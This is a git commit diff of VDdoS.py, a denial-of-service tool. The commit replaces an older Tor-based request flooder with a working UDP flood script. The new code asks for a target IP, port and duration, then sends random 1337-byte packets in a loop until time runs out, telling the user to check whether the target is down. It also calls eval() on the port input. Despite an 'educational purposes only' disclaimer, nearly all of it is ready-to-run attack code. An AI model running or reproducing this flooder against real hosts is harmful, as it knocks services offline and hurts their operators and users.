0e919665b1c200d13697f5e6033b96ad913256ab
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-17 11:19:52 +0300

    Update VDdoS.py

--- VDdoS.py
+++ VDdoS.py
@@ -15,67 +15,68 @@ print (''' \033[92m
 
 print()
 
-import socket
-import time
-import threading
-import datetime
 import sys
+import os
+import time
+import socket
+import random
+from termcolor import colored
+#This is where the magic starts using the power of python
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-from lib.color import color
-from lib.tor import Tor
-
-
-def main():
-    counter = 0
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1337)
+#############
+#Install Figlet
+os.system("clear")
+os.system("apt-get install -y figlet")
+os.system("figlet Black Hat Ethical Hacking")
+print()
+print(colored("Author   : SaintDruG", 'green'))
+print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
+print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
+print(colored("Facebook : https://www.facebook.com/secur1ty1samyth", 'green'))
+print(colored("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
+print(colored("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/", 'magenta'))
+print(colored("Instagram : https://www.instagram.com/blackhatethicalhacking/", 'yellow'))
+print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
+print(colored("Security is a myth..   : Follow us & Stay Tuned!", 'magenta'))
+print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
+print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
+print()
+ip = input(" IP Target: => ")
+port = eval(input(" Port  : => "))
+dur = input("Time: ")
+timeout = time.time() + int(dur)
+sent = 0
+os.system("clear")
+os.system("figlet Attack Starting")
+print(colored("[                    ] 0% ",'blue'))
+time.sleep(4.9)
+print(colored("[=====               ] 25%", 'red'))
+time.sleep(4.9)
+print(colored("[==========          ] 50%",'magenta'))
+time.sleep(4.9)
+print(colored("[===============     ] 75%", 'yellow'))
+time.sleep(4.9)
+print(colored("[====================] 100%",'green'))
+time.sleep(2.9)
+while True:
     try:
-        while counter < max_attempts:
-            tor = Tor()
-            if not tor.tor_installed():
-                print( u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
-                sys.exit(1)
-            else:
-                # Initial timestamp and increment the counter
-                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-                counter += 1
-
-                # Init a new Tor session
-                session = tor.new_session()
-                print( u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
-                print( u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
-
-                # Getting data from the server
-                print( u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
-                session.get(target)
-                # Putting data (omitted, maybe it makes detection easier)
-                # random_bytes = random._urandom(1490)
-                # print( u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
-                # session.put(target, random_bytes)
-                print( u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
-
-    except KeyboardInterrupt: pass
-    except Exception,exception:
-        print( u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
-        print( u'{}{}{}'.format(color.RED, exception, Exception, color.END))
-
-    finally:
-        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
-        print( u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
-        print( u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter))
-        print( u'{}[!]{} Stopping Tor...'.format(color.RED, color.END))
-        tor.stop_tor()
-        print( u'{}[!]{} Exiting...\n'.format(color.RED, color.END))
-        sys.exit(0)
-
-
-if __name__ == '__main__':
-    # Processing args
-    from lib.args import *
-    args = parser.parse_args()
-    target = args.target
-    max_attempts = args.max_attempts
-    # Print help and exit when it runs without target arg
-    if not target:
-        parser.print_help(sys.stdout); sys.exit(2)
-    # Run the main execution
-    main()
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        sock.sendto(bytes, (ip, port))
+        sent += 1
+        print(colored("Packets are being sent like crazy, check if the target is down... we sent %s packets to this Target: %s" % (
+            sent, ip), 'green'))
+    except KeyboardInterrupt:
+        sys.exit()
